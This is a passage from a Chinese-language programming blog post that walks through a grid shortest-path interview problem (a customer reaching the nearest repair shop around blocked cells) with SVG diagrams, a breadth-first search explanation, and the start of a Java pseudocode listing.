id="Line-2"/>            <line x1="908" y1="4.5" x2="908" y2="1003.5" id="Line-2"/>        </g>        <line x1="600" y1="400" x2="600.5" y2="599.5" id="y" stroke="#FF0000" stroke-width="5" stroke-linecap="square"/>        <line x1="203" y1="400.5" x2="202.5" y2="601" id="y" stroke="#003DFF" stroke-width="5" stroke-linecap="square"/>        <line x1="203.5" y1="398.5" x2="600.5" y2="399.5" id="x" stroke="#FF0000" stroke-width="5" stroke-linecap="square"/>        <line x1="205" y1="601" x2="600.5" y2="601.5" id="x" stroke="#003DFF" stroke-width="5" stroke-linecap="square"/>        <line x1="1608.5" y1="602.5" x2="1808" y2="602" id="x" stroke="#003DFF" stroke-width="5" stroke-linecap="square"/>        <line x1="1402" y1="399.5" x2="1608.5" y2="399" id="x" stroke="#003DFF" stroke-width="5" stroke-linecap="square"/>        <line x1="1608.5" y1="398.5" x2="1608.5" y2="602.5" id="x" stroke="#003DFF" stroke-width="5" stroke-linecap="square"/>        <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" cx="600" cy="601" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" cx="1812" cy="601" r="19.5"/>        <circle id="Oval" stroke="#FF8D8D" fill="#FD9B9B" cx="205" cy="397" r="19.5"/>        <circle id="Oval" stroke="#FF8D8D" fill="#FD9B9B" cx="1412" cy="399" r="19.5"/>    </g></svg><p>然后我们再稍微复杂一点，此时顾客和维修点之间是田字格，最短路径就有三条，距离为 3</p><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="800px" height="400px" viewBox="0 0 2402 1201" version="1.1">    <g id="128x128" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">        <g id="Group" transform="translate(1296, 97.5)" stroke="#979797" stroke-linecap="square">            <line x1="0.5" y1="103" x2="1006.5" y2="103" id="Line"/>            <line x1="6" y1="303.5" x2="1012" y2="303.5" id="Line"/>            <line x1="6" y1="504.5" x2="1012" y2="504.5" id="Line"/>            <line x1="1" y1="705.5" x2="1007" y2="705.5" id="Line"/>            <line x1="6" y1="906.5" x2="1012" y2="906.5" id="Line"/>            <line x1="110.5" y1="6" x2="110.5" y2="1005" id="Line-2"/>            <line x1="311" y1="6.5" x2="311" y2="1005.5" id="Line-2"/>            <line x1="504" y1="0.5" x2="504" y2="999.5" id="Line-2"/>            <line x1="706" y1="4.5" x2="706" y2="1003.5" id="Line-2"/>            <line x1="908" y1="4.5" x2="908" y2="1003.5" id="Line-2"/>        </g>        <g id="Group" transform="translate(94, 96.5)" stroke="#979797" stroke-linecap="square">            <line x1="0.5" y1="103" x2="1006.5" y2="103" id="Line"/>            <line x1="6" y1="303.5" x2="1012" y2="303.5" id="Line"/>            <line x1="6" y1="504.5" x2="1012" y2="504.5" id="Line"/>            <line x1="1" y1="705.5" x2="1007" y2="705.5" id="Line"/>            <line x1="6" y1="906.5" x2="1012" y2="906.5" id="Line"/>            <line x1="110.5" y1="6" x2="110.5" y2="1005" id="Line-2"/>            <line x1="311" y1="6.5" x2="311" y2="1005.5" id="Line-2"/>            <line x1="504" y1="0.5" x2="504" y2="999.5" id="Line-2"/>            <line x1="706" y1="4.5" x2="706" y2="1003.5" id="Line-2"/>            <line x1="908" y1="4.5" x2="908" y2="1003.5" id="Line-2"/>        </g>        <path id="Line-3" d="M1409,603 L1409,771 L1423,771 L1406,805 L1389,771 L1403,771 L1403,603 L1409,603 Z" fill="#718EE5" fill-rule="nonzero"/>        <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" cx="1801.5" cy="804.5" r="19.5"/>        <path id="Line-3" d="M1573.41584,383.669363 L1607.5,400.5 L1573.585,417.668942 L1573.514,403.669 L1406.51493,404.499963 L1403.51496,404.514888 L1403.48511,398.514962 L1406.48507,398.500037 L1573.485,397.669 L1573.41584,383.669363 Z" fill="#5FB88F" fill-rule="nonzero"/>        <path id="Line-3" d="M1410,401 L1410,569 L1424,569 L1407,603 L1390,569 L1404,569 L1404,401 L1410,401 Z" fill="#718EE5" fill-rule="nonzero"/>        <path id="Line-3" d="M1610.5,401.5 L1610.5,569.5 L1624.5,569.5 L1607.5,603.5 L1590.5,569.5 L1604.5,569.5 L1604.5,401.5 L1610.5,401.5 Z" fill="#718EE5" fill-rule="nonzero"/>        <path id="Line-3" d="M1805.5,399.5 L1805.5,567.5 L1819.5,567.5 L1802.5,601.5 L1785.5,567.5 L1799.5,567.5 L1799.5,399.5 L1805.5,399.5 Z" fill="#718EE5" fill-rule="nonzero"/>        <path id="Line-3" d="M1573.91584,584.169363 L1608,601 L1574.085,618.168942 L1574.014,604.169 L1407.01493,604.999963 L1404.01496,605.014888 L1403.98511,599.014962 L1406.98507,599.000037 L1573.985,598.169 L1573.91584,584.169363 Z" fill="#5FB88F" fill-rule="nonzero"/>        <path id="Line-3" d="M1774.91584,584.169363 L1809,601 L1775.085,618.168942 L1775.014,604.169 L1608.01493,604.999963 L1605.01496,605.014888 L1604.98511,599.014962 L1607.98507,599.000037 L1774.985,598.169 L1774.91584,584.169363 Z" fill="#5FB88F" fill-rule="nonzero"/>        <path id="Line-3" d="M1774.91584,786.169363 L1809,803 L1775.085,820.168942 L1775.014,806.169 L1608.01493,806.999963 L1605.01496,807.014888 L1604.98511,801.014962 L1607.98507,801.000037 L1774.985,800.169 L1774.91584,786.169363 Z" fill="#5FB88F" fill-rule="nonzero"/>        <path id="Line-3" d="M1573.91584,786.169363 L1608,803 L1574.085,820.168942 L1574.014,806.169 L1407.01493,806.999963 L1404.01496,807.014888 L1403.98511,801.014962 L1406.98507,801.000037 L1573.985,800.169 L1573.91584,786.169363 Z" fill="#5FB88F" fill-rule="nonzero"/>        <path id="Line-3" d="M1777.91584,385.169363 L1812,402 L1778.085,419.168942 L1778.014,405.169 L1611.01493,405.999963 L1608.01496,406.014888 L1607.98511,400.014962 L1610.98507,400.000037 L1777.985,399.169 L1777.91584,385.169363 Z" fill="#5FB88F" fill-rule="nonzero"/>        <line x1="600.25" y1="400.75" x2="600.75" y2="804.25" id="y" stroke="#FF0000" stroke-width="5" stroke-linecap="square"/>        <line x1="202.75" y1="400.5" x2="204.25" y2="804.5" id="y" stroke="#003DFF" stroke-width="5" stroke-linecap="square"/>        <line x1="203.5" y1="398.5" x2="600.5" y2="396.5" id="x" stroke="#FF0000" stroke-width="5" stroke-linecap="square"/>        <path id="Line-3" d="M1610,603 L1610,771 L1624,771 L1607,805 L1590,771 L1604,771 L1604,603 L1610,603 Z" fill="#718EE5" fill-rule="nonzero"/>        <path id="Line-3" d="M1805,601 L1805,769 L1819,769 L1802,803 L1785,769 L1799,769 L1799,601 L1805,601 Z" fill="#718EE5" fill-rule="nonzero"/>        <line x1="204.75" y1="804.75" x2="602.25" y2="804.25" id="x" stroke="#003DFF" stroke-width="5" stroke-linecap="square"/>        <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" cx="602" cy="805" r="19.5"/>        <circle id="Oval" stroke="#FF8D8D" fill="#FD9B9B" cx="205" cy="397" r="19.5"/>        <circle id="Oval" stroke="#FF8D8D" fill="#FD9B9B" cx="1412" cy="399" r="19.5"/>    </g></svg><p>等到田字格的时候，相信聪明的你已经发现了规律</p><p>那就是顾客到维修点的最短距离，等于他们所形成的矩形的横纵两条边边长的总和</p><p>按照上面右侧图片所示的箭头所行走的距离都等于这个最短路径</p><hr><p>一般情况下，面试场景的编码题已经可以开始写了</p><p>对应的编程思路就是，从维修点出发，在与顾客构成的矩形边界里面，不断逼近，只要能走通那么我们之间就有了最短距离</p><p>再把不同维修点到顾客的最短距离排序，选出最小的距离来进行计算费用</p><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="800px" height="400px" viewBox="0 0 2215 1008" version="1.1">    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">        <g id="step6" transform="translate(0.5, 1)">            <g id="Group" stroke-linecap="square" transform="translate(1202, 1)" stroke="#979797">                <line x1="0" y1="102.5" x2="1006" y2="102.5" id="Line"/>                <line x1="5.5" y1="303" x2="1011.5" y2="303" id="Line"/>                <line x1="5.5" y1="504" x2="1011.5" y2="504" id="Line"/>                <line x1="0.5" y1="705" x2="1006.5" y2="705" id="Line"/>                <line x1="5.5" y1="906" x2="1011.5" y2="906" id="Line"/>                <line x1="110" y1="5.5" x2="110" y2="1004.5" id="Line-2"/>                <line x1="310.5" y1="6" x2="310.5" y2="1005" id="Line-2"/>                <line x1="503.5" y1="0" x2="503.5" y2="999" id="Line-2"/>                <line x1="705.5" y1="4" x2="705.5" y2="1003" id="Line-2"/>                <line x1="907.5" y1="4" x2="907.5" y2="1003" id="Line-2"/>            </g>            <g id="Group" stroke-linecap="square" stroke="#979797">                <line x1="0" y1="102.5" x2="1006" y2="102.5" id="Line"/>                <line x1="5.5" y1="303" x2="1011.5" y2="303" id="Line"/>                <line x1="5.5" y1="504" x2="1011.5" y2="504" id="Line"/>                <line x1="0.5" y1="705" x2="1006.5" y2="705" id="Line"/>                <line x1="5.5" y1="906" x2="1011.5" y2="906" id="Line"/>                <line x1="110" y1="5.5" x2="110" y2="1004.5" id="Line-2"/>                <line x1="310.5" y1="6" x2="310.5" y2="1005" id="Line-2"/>                <line x1="503.5" y1="0" x2="503.5" y2="999" id="Line-2"/>                <line x1="705.5" y1="4" x2="705.5" y2="1003" id="Line-2"/>                <line x1="907.5" y1="4" x2="907.5" y2="1003" id="Line-2"/>            </g>            <line x1="905.498111" y1="108.802083" x2="906.50189" y2="707.129289" id="y" stroke="#FF0000" stroke-width="5" stroke-linecap="square"/>            <line x1="2109.49433" y1="103.060662" x2="2109" y2="909.5" id="y" stroke="#FF0000" stroke-width="5" stroke-linecap="square"/>            <line x1="1309" y1="506.5" x2="1309.49055" y2="908.75858" id="y" stroke="#FF0000" stroke-width="5" stroke-linecap="square"/>            <line x1="109" y1="105.465686" x2="906" y2="102.5" id="x" stroke="#FF0000" stroke-width="5" stroke-linecap="square"/>            <line x1="1308.99622" y1="106.724265" x2="2105.99622" y2="103.758578" id="x" stroke="#FF0000" stroke-width="5" stroke-linecap="square"/>            <line x1="1308.99244" y1="504.982843" x2="1710" y2="506.5" id="x" stroke="#FF0000" stroke-width="5" stroke-linecap="square"/>            <line x1="1311.99244" y1="909.98284" x2="2108.99244" y2="907.01716" id="x" stroke="#FF0000" stroke-width="5" stroke-linecap="square"/>            <line x1="708.25" y1="705.25" x2="902.75" y2="704.75" id="x" stroke="#FF0000" stroke-width="5" stroke-linecap="square"/>            <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" fill-rule="nonzero" cx="707.5" cy="707" r="19.5"/>            <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" fill-rule="nonzero" cx="1707.5" cy="503" r="19.5"/>            <circle id="Oval" stroke="#FF8D8D" fill="#FD9B9B" fill-rule="nonzero" cx="110.5" cy="103" r="19.5"/>            <polygon id="Star" fill="#3FC0FD" fill-rule="nonzero" points="110 315.75 94.423691 323.93895 97.398501 306.594475 84.797002 294.31105 102.211845 291.780525 110 276 117.788155 291.780525 135.202998 294.31105 122.601499 306.594475 125.576309 323.93895"/>            <polygon id="Star" fill="#3FC0FD" fill-rule="nonzero" points="309 315.75 293.423691 323.93895 296.398501 306.594475 283.797002 294.31105 301.211845 291.780525 309 276 316.788155 291.780525 334.202998 294.31105 321.601499 306.594475 324.576309 323.93895"/>            <polygon id="Star" fill="#3FC0FD" fill-rule="nonzero" points="708 515.75 692.423691 523.93895 695.398501 506.594475 682.797002 494.31105 700.211845 491.780525 708 476 715.788155 491.780525 733.202998 494.31105 720.601499 506.594475 723.576309 523.93895"/>            <polygon id="Star" fill="#3FC0FD" fill-rule="nonzero" points="1905 519.75 1889.42369 527.93895 1892.3985 510.594475 1879.797 498.31105 1897.21185 495.780525 1905 480 1912.78815 495.780525 1930.203 498.31105 1917.6015 510.594475 1920.57631 527.93895"/>            <polygon id="Star" fill="#3FC0FD" fill-rule="nonzero" points="1905 720.75 1889.42369 728.93895 1892.3985 711.594475 1879.797 699.31105 1897.21185 696.780525 1905 681 1912.78815 696.780525 1930.203 699.31105 1917.6015 711.594475 1920.57631 728.93895"/>            <polygon id="Star" fill="#3FC0FD" fill-rule="nonzero" points="1706 717.75 1690.42369 725.93895 1693.3985 708.594475 1680.797 696.31105 1698.21185 693.780525 1706 678 1713.78815 693.780525 1731.203 696.31105 1718.6015 708.594475 1721.57631 725.93895"/>            <polygon id="Star" fill="#3FC0FD" fill-rule="nonzero" points="1513 720.75 1497.42369 728.93895 1500.3985 711.594475 1487.797 699.31105 1505.21185 696.780525 1513 681 1520.78815 696.780525 1538.203 699.31105 1525.6015 711.594475 1528.57631 728.93895"/>            <polygon id="Star" fill="#3FC0FD" fill-rule="nonzero" points="506 315.75 490.423691 323.93895 493.398501 306.594475 480.797002 294.31105 498.211845 291.780525 506 276 513.788155 291.780525 531.202998 294.31105 518.601499 306.594475 521.576309 323.93895"/>            <polygon id="Star" fill="#3FC0FD" fill-rule="nonzero" points="705 315.75 689.423691 323.93895 692.398501 306.594475 679.797002 294.31105 697.211845 291.780525 705 276 712.788155 291.780525 730.202998 294.31105 717.601499 306.594475 720.576309 323.93895"/>            <polygon id="Star" fill="#3FC0FD" fill-rule="nonzero" points="1509 315.75 1493.42369 323.93895 1496.3985 306.594475 1483.797 294.31105 1501.21185 291.780525 1509 276 1516.78815 291.780525 1534.203 294.31105 1521.6015 306.594475 1524.57631 323.93895"/>            <polygon id="Star" fill="#3FC0FD" fill-rule="nonzero" points="1317 315.75 1301.42369 323.93895 1304.3985 306.594475 1291.797 294.31105 1309.21185 291.780525 1317 276 1324.78815 291.780525 1342.203 294.31105 1329.6015 306.594475 1332.57631 323.93895"/>            <polygon id="Star" fill="#3FC0FD" fill-rule="nonzero" points="1706 315.75 1690.42369 323.93895 1693.3985 306.594475 1680.797 294.31105 1698.21185 291.780525 1706 276 1713.78815 291.780525 1731.203 294.31105 1718.6015 306.594475 1721.57631 323.93895"/>            <polygon id="Star" fill="#3FC0FD" fill-rule="nonzero" points="1905 315.75 1889.42369 323.93895 1892.3985 306.594475 1879.797 294.31105 1897.21185 291.780525 1905 276 1912.78815 291.780525 1930.203 294.31105 1917.6015 306.594475 1920.57631 323.93895"/>            <circle id="Oval" stroke="#FF8D8D" fill="#FD9B9B" fill-rule="nonzero" cx="1311.5" cy="109" r="19.5"/>        </g>    </g></svg><p>倘若以上面的推论作为最终编码的方式，虽然不能说完全错误，但是在当下这个面试很卷的时代，还是有可能被 PASS，为什么呢？</p><p>因为我们还没有引入阻塞的概念。我们随便画两种阻塞的情况，并且假定这里都属于在当时条件下的最短路径，那么阁下又该如何应对？</p><p><img src="https://s2.loli.net/2025/01/09/A8UiyQznaI6TejY.webp" alt="true.webp"></p><p>某种意义上说，我们的确需要从头来审视这道题目。从前面的分析和题目中，我们得出两个结论</p><ol><li>最短的距离永远是尽量在水平和垂直距离上向目标靠近的走法</li><li>用户每次前进，在没有阻塞的时候，其实可以最多可以往四个方向去走</li></ol><p>以此为基础，我们就可以稍微来复习一下大学的算法知识了，贪心算法（贪婪算法）</p><p>贪心算法的定义网上随随便便都能找到，这里就不再复述，我们更多地是需要去思考在这个场景的贪心算法如何使用</p><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="800px" height="400px" viewBox="0 0 2402 1201" version="1.1">    <g id="128x128" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">        <g id="Group" transform="translate(1296, 97.5)" stroke="#979797" stroke-linecap="square">            <line x1="0.5" y1="103" x2="1006.5" y2="103" id="Line"/>            <line x1="6" y1="303.5" x2="1012" y2="303.5" id="Line"/>            <line x1="6" y1="504.5" x2="1012" y2="504.5" id="Line"/>            <line x1="1" y1="705.5" x2="1007" y2="705.5" id="Line"/>            <line x1="6" y1="906.5" x2="1012" y2="906.5" id="Line"/>            <line x1="110.5" y1="6" x2="110.5" y2="1005" id="Line-2"/>            <line x1="311" y1="6.5" x2="311" y2="1005.5" id="Line-2"/>            <line x1="504" y1="0.5" x2="504" y2="999.5" id="Line-2"/>            <line x1="706" y1="4.5" x2="706" y2="1003.5" id="Line-2"/>            <line x1="908" y1="4.5" x2="908" y2="1003.5" id="Line-2"/>        </g>        <g id="Group" transform="translate(94, 96.5)" stroke="#979797" stroke-linecap="square">            <line x1="0.5" y1="103" x2="1006.5" y2="103" id="Line"/>            <line x1="6" y1="303.5" x2="1012" y2="303.5" id="Line"/>            <line x1="6" y1="504.5" x2="1012" y2="504.5" id="Line"/>            <line x1="1" y1="705.5" x2="1007" y2="705.5" id="Line"/>            <line x1="6" y1="906.5" x2="1012" y2="906.5" id="Line"/>            <line x1="110.5" y1="6" x2="110.5" y2="1005" id="Line-2"/>            <line x1="311" y1="6.5" x2="311" y2="1005.5" id="Line-2"/>            <line x1="504" y1="0.5" x2="504" y2="999.5" id="Line-2"/>            <line x1="706" y1="4.5" x2="706" y2="1003.5" id="Line-2"/>            <line x1="908" y1="4.5" x2="908" y2="1003.5" id="Line-2"/>        </g>        <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" cx="600" cy="798" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" cx="802" cy="600" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" cx="600" cy="401" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" cx="402" cy="599" r="19.5"/>        <circle id="Oval" stroke="#FF8D8D" fill="#FD9B9B" cx="602" cy="599" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" cx="1800" cy="799" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#60E382" cx="1802" cy="1008" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#60E382" cx="1602" cy="799" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#60E382" cx="1404" cy="599" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#60E382" cx="1611" cy="401" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#60E382" cx="1800" cy="204" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#60E382" cx="2002" cy="799" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#60E382" cx="2208" cy="606" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#60E382" cx="2002" cy="401" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" cx="2002" cy="601" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" cx="1800" cy="402" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" cx="1602" cy="600" r="19.5"/>        <circle id="Oval" stroke="#FF8D8D" fill="#FD9B9B" cx="1802" cy="600" r="19.5"/>        <polygon id="Star" fill="#FF0B0B" points="1002.5 1027.25 980.458053 1038.83814 984.66769 1014.29407 966.835381 996.911863 991.479027 993.330931 1002.5 971 1013.52097 993.330931 1038.16462 996.911863 1020.33231 1014.29407 1024.54195 1038.83814"/>        <polygon id="Star" fill="#FF0B0B" points="2208.5 1027.25 2186.45805 1038.83814 2190.66769 1014.29407 2172.83538 996.911863 2197.47903 993.330931 2208.5 971 2219.52097 993.330931 2244.16462 996.911863 2226.33231 1014.29407 2230.54195 1038.83814"/>    </g></svg><p>贪心算法的第一步，就是找寻从顾客开始，所有可能能行走方向距离为 1 的点有哪些（图中蓝色的点）</p><p>接着，我们可以以这些距离为 1 的点为基础，去找寻所有距离为 2 的点（图中绿色的点）</p><p>以此类推，直到所有的点都没有下一个可以行走的点了</p><p>而每计算一次距离为 N 的点的时候，都可以尝试看看里面是否有对应的维修点，如果有，那么终止检索，这个 N 便是最短距离</p><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="800px" height="400px" viewBox="0 0 2402 1201" version="1.1">    <g id="128x128" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">        <g id="Group" transform="translate(1296, 97.5)" stroke="#979797" stroke-linecap="square">            <line x1="0.5" y1="103" x2="1006.5" y2="103" id="Line"/>            <line x1="6" y1="303.5" x2="1012" y2="303.5" id="Line"/>            <line x1="6" y1="504.5" x2="1012" y2="504.5" id="Line"/>            <line x1="1" y1="705.5" x2="1007" y2="705.5" id="Line"/>            <line x1="6" y1="906.5" x2="1012" y2="906.5" id="Line"/>            <line x1="110.5" y1="6" x2="110.5" y2="1005" id="Line-2"/>            <line x1="311" y1="6.5" x2="311" y2="1005.5" id="Line-2"/>            <line x1="504" y1="0.5" x2="504" y2="999.5" id="Line-2"/>            <line x1="706" y1="4.5" x2="706" y2="1003.5" id="Line-2"/>            <line x1="908" y1="4.5" x2="908" y2="1003.5" id="Line-2"/>        </g>        <g id="Group" transform="translate(94, 96.5)" stroke="#979797" stroke-linecap="square">            <line x1="0.5" y1="103" x2="1006.5" y2="103" id="Line"/>            <line x1="6" y1="303.5" x2="1012" y2="303.5" id="Line"/>            <line x1="6" y1="504.5" x2="1012" y2="504.5" id="Line"/>            <line x1="1" y1="705.5" x2="1007" y2="705.5" id="Line"/>            <line x1="6" y1="906.5" x2="1012" y2="906.5" id="Line"/>            <line x1="110.5" y1="6" x2="110.5" y2="1005" id="Line-2"/>            <line x1="311" y1="6.5" x2="311" y2="1005.5" id="Line-2"/>            <line x1="504" y1="0.5" x2="504" y2="999.5" id="Line-2"/>            <line x1="706" y1="4.5" x2="706" y2="1003.5" id="Line-2"/>            <line x1="908" y1="4.5" x2="908" y2="1003.5" id="Line-2"/>        </g>        <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" cx="599" cy="797" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#60E382" cx="601" cy="1006" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#60E382" cx="401" cy="797" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#60E382" cx="203" cy="597" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#60E382" cx="410" cy="399" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#60E382" cx="599" cy="202" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#60E382" cx="801" cy="797" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#60E382" cx="1007" cy="604" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#60E382" cx="801" cy="399" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" cx="801" cy="599" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" cx="599" cy="400" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" cx="401" cy="598" r="19.5"/>        <circle id="Oval" stroke="#FF8D8D" fill="#FD9B9B" cx="601" cy="598" r="19.5"/>        <circle id="Oval" fill="#FFD31C" cx="801" cy="202" r="20"/>        <circle id="Oval" fill="#FFD31C" cx="1001" cy="400" r="20"/>        <circle id="Oval" fill="#FFD31C" cx="401" cy="202" r="20"/>        <circle id="Oval" fill="#FFD31C" cx="203" cy="399" r="20"/>        <circle id="Oval" fill="#FFD31C" cx="1007" cy="803" r="20"/>        <circle id="Oval" fill="#FFD31C" cx="801" cy="1006" r="20"/>        <circle id="Oval" fill="#FFD31C" cx="203" cy="803" r="20"/>        <circle id="Oval" fill="#FFD31C" cx="401" cy="1007" r="20"/>        <polygon id="Star" fill="#FF0B0B" points="1007.5 1025.25 985.458053 1036.83814 989.66769 1012.29407 971.835381 994.911863 996.479027 991.330931 1007.5 969 1018.52097 991.330931 1043.16462 994.911863 1025.33231 1012.29407 1029.54195 1036.83814"/>        <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" cx="1800" cy="797" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#60E382" cx="1802" cy="1006" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#60E382" cx="1602" cy="797" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#60E382" cx="1404" cy="597" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#60E382" cx="1611" cy="399" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#60E382" cx="1800" cy="202" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#60E382" cx="2002" cy="797" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#60E382" cx="2208" cy="604" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#60E382" cx="2002" cy="399" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" cx="2002" cy="599" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" cx="1800" cy="400" r="19.5"/>        <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" cx="1602" cy="598" r="19.5"/>        <circle id="Oval" stroke="#FF8D8D" fill="#FD9B9B" cx="1802" cy="598" r="19.5"/>        <circle id="Oval" fill="#FFD31C" cx="2002" cy="202" r="20"/>        <circle id="Oval" fill="#FFD31C" cx="2202" cy="400" r="20"/>        <circle id="Oval" fill="#FFD31C" cx="1602" cy="202" r="20"/>        <circle id="Oval" fill="#FFD31C" cx="1404" cy="399" r="20"/>        <circle id="Oval" fill="#FFD31C" cx="2208" cy="803" r="20"/>        <circle id="Oval" fill="#FFD31C" cx="2002" cy="1006" r="20"/>        <circle id="Oval" fill="#FFD31C" cx="1404" cy="803" r="20"/>        <circle id="Oval" fill="#FFD31C" cx="1602" cy="1007" r="20"/>        <polygon id="Star" fill="#FF0B0B" points="2208.5 1025.25 2186.45805 1036.83814 2190.66769 1012.29407 2172.83538 994.911863 2197.47903 991.330931 2208.5 969 2219.52097 991.330931 2244.16462 994.911863 2226.33231 1012.29407 2230.54195 1036.83814"/>        <circle id="Oval" fill="#FFD31C" cx="2208" cy="803" r="20"/>        <path id="Line-3" d="M1972.28782,584.924819 L2001.49994,598.992575 L1972.71847,613.921622 L1972.54,601.923 L1799.03712,604.499724 L1796.5374,604.536849 L1796.46315,599.5374 L1798.96288,599.500276 L1972.465,596.923 L1972.28782,584.924819 Z" fill="#979797" fill-rule="nonzero"/>        <path id="Line-3" d="M1971.78782,584.424819 L2000.99994,598.492575 L1972.21847,613.421622 L1972.04,601.423 L1798.53712,603.999724 L1796.0374,604.036849 L1795.96315,599.0374 L1798.46288,599.000276 L1971.965,596.423 L1971.78782,584.424819 Z" fill="#979797" fill-rule="nonzero"/>        <path id="Line-3" d="M2174.78782,584.424819 L2203.99994,598.492575 L2175.21847,613.421622 L2175.04,601.423 L2001.53712,603.999724 L1999.0374,604.036849 L1998.96315,599.0374 L2001.46288,599.000276 L2174.965,596.423 L2174.78782,584.424819 Z" fill="#979797" fill-rule="nonzero"/>        <path id="Line-3" d="M2205.9943,594.994312 L2205.99999,597.494305 L2206.434,788.494 L2218.43504,788.467044 L2204.00114,817.499999 L2189.43512,788.533103 L2201.434,788.506 L2201.00001,597.505695 L2200.99431,595.005701 L2205.9943,594.994312 Z" fill="#979797" fill-rule="nonzero"/>        <path id="Line-3" d="M2209.4943,804.494312 L2209.49999,806.994305 L2209.934,997.994 L2221.93504,997.967044 L2207.50114,1027 L2192.93512,998.033103 L2204.934,998.006 L2204.50001,807.005695 L2204.49431,804.505701 L2209.4943,804.494312 Z" fill="#979797" fill-rule="nonzero"/>    </g></svg><p>如上图所示，在我们查找距离为 4 的点的时候，我们就能找到目标维修店，那么我们可以认定，起最短距离就是 4</p><p>下面就可以考虑编码了，倘若是在算法竞赛里面（这种题连算竞入门题都不算啦），首先需要考虑的是时空效率</p><p>我们首先定义一个二维数组，并在上面放上维修店，假定魔力数字 -1</p><p>然后放上所有阻塞的点，假定魔力数字为 -2。数组里面数字为 0 的地方代表没有走过的点，为 1 的值则代表走过的点</p><p>那么此检索最短路径的算法大概应该类似如下内容，类伪代码，不代表最终能运行品质：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[][] routines = <span class="keyword">new</span> <span class="title class_">int</span>[x][y];</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">record</span> <span class="title class_">Point</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> 